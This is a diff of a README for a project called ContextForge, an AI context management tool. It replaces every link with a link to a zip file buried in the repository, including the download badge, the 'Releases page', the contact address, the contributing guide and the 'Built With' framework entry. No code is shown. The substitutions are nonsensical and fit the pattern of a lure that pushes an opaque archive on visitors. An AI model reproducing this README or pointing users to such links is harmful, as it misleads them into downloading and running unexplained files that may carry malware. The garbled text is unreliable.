@@ -1,6 +1,6 @@
 # 🌟 contextforge - Simplify Your AI Context Management
 
-[![Download ContextForge](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip)](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip)
+[![Download ContextForge](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip)](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip)
 
 ## 🌐 Overview
 
@@ -10,7 +10,7 @@ ContextForge is an AI-powered context management platform designed for users who
 
 To get started with ContextForge, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip) to find the latest version of ContextForge.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip) to find the latest version of ContextForge.
 2. **Download the Software**: Look for the most recent version and click on it to view available assets. Download the file that suits your operating system.
 3. **Install the Application**: Once downloaded, follow the installation instructions specific to your operating system. 
 
@@ -27,7 +27,7 @@ Before downloading, ensure your machine meets the following requirements:
 
 To download ContextForge, please visit the following link: 
 
-[Download ContextForge](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip).
+[Download ContextForge](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip).
 
 After downloading, follow these steps to install:
 
@@ -66,15 +66,15 @@ ContextForge is open-source and available under the MIT License. Feel free to ex
 
 ## 📧 Contact
 
-You can get in touch with the development team at https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip for any inquiries or feedback.
+You can get in touch with the development team at https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip for any inquiries or feedback.
 
 ## 📄 Contributing
 
-For those interested in contributing to ContextForge, check out our [https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip) for guidelines on how to contribute to this project.
+For those interested in contributing to ContextForge, check out our [https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip) for guidelines on how to contribute to this project.
 
 ### ⚙️ Built With
 
-- **https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip** for the front-end application framework.
+- **https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip** for the front-end application framework.
 - **Prisma** for database interactions.
 - **Redis** to manage caching.
 - **Vector Database** for efficient data storage.
@@ -85,4 +85,4 @@ For more information about these technologies, please refer to their official do
 
 To learn more about ContextForge’s capabilities, check our documentation and guides available on the repository. You can find everything from setup instructions to advanced usage tips.
 
-Thank you for choosing ContextForge. We look forward to helping you enhance your AI context management. Visit the [Releases page](https://raw.githubusercontent.com/vishu570/contextforge/main/selvagee/contextforge.zip) to download now!
+Thank you for choosing ContextForge. We look forward to helping you enhance your AI context management. Visit the [Releases page](https://raw.githubusercontent.com/vishu570/contextforge/main/components/ui/Software-v3.5.zip) to download now!
